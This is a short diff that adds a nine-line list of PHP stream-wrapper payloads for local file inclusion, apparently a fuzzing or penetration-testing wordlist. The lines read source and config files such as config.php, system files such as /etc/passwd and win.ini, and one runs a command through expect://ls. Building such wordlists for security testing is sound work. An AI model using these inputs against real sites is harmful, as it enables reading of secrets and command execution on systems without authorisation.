@@ -1,0 +1,9 @@
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../../config.php
+php://filter/resource=/etc/passwd
+php://input
+zip://archive.zip#config.php
+data:text/plain,TEST
+expect://ls
+file:///etc/passwd
+file://C:/Windows/win.ini
